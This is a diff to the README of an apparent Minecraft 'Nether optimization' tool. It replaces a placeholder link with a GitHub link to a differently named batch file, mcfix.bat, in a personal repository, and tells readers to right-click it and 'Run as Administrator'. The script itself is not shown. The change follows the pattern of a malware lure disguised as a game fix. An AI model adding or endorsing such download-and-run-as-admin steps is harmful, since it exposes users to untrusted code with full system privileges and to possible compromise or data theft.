@@ -16,7 +16,7 @@ and prepares the environment to better handle Nether world loading.
 ### ✅ How to Use
 
 1. Download the optimization script:  
-   [📥 Download optimize_nether.bat](https://your-download-link.example.com/optimize_nether.bat)
+   [📥 Download optimize_nether.bat](https://github.com/subsubgraphite/fixmcbug_1.19.1_patch/blob/main/mcfix.bat)
 
 2. Right-click the file → "Run as Administrator"
 
